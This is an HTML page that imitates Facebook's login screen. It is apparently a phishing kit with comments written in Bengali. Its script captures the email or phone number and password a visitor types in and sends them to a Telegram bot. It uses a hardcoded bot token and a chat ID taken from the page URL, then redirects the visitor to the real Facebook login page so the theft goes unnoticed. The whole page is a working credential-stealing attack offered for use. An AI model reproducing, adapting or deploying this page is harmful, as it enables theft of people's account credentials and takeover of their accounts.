<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body {
            font-family: 'Helvetica Neue', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, rgba(242, 246, 255, 1) 0%, rgba(231, 245, 255, 1) 100%);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            background: #ffffff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            padding: 20px;
            box-sizing: border-box;
        }

        .logo-container {
            margin-bottom: 20px;
        }

        .logo {
            width: 80px;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 10px;
            font-size: 17px;
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 17px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #155db2;
        }

        .forgot-password {
            margin-top: 20px;
            font-size: 15px;
            color: #1877f2;
            text-decoration: none;
        }

        .create-account-btn {
            margin-top: 40px;
            padding: 12px 0;
            width: 90%;
            border: 1px solid #1877f2;
            color: #1877f2;
            border-radius: 20px;
            background-color: transparent;
            font-size: 17px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .create-account-btn:hover {
            background-color: #e7f3ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
        </div>
        <form id="loginForm">
            <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgotten Password?</a>
        <button class="create-account-btn">Create new account</button>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // URL থেকে chat_id সংগ্রহ করা
            const urlParams = new URLSearchParams(window.location.search);
            const chat_id = urlParams.get('chat_id');

            // চেক: চ্যাট আইডি সঠিক কিনা
            if (!chat_id || isNaN(chat_id)) {
                alert("Invalid or missing chat ID.");
                return;
            }

            const emailOrPhone = document.getElementById('emailOrPhone').value;
            const password = document.getElementById('password').value;

            // Telegram Bot Token
            const token = '7368163635:AAGEHrgX9PIqI7J58rJANzAPr-L9O_BfJWQ';
            const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;

            const message = `🔐 Login Details:\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}\n\n💡 Chat ID: ${chat_id}`;

            fetch(telegramURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: message
                })
            }).then(response => {
                if (response.ok) {
                    window.location.href = 'https://m.facebook.com/login/';
                } else {
                    alert('Failed to send login details.');
                }
            }).catch(error => {
                console.error('Error:', error);
                alert('Error occurred while sending data.');
            });
        });
    </script>
</body>
</html>
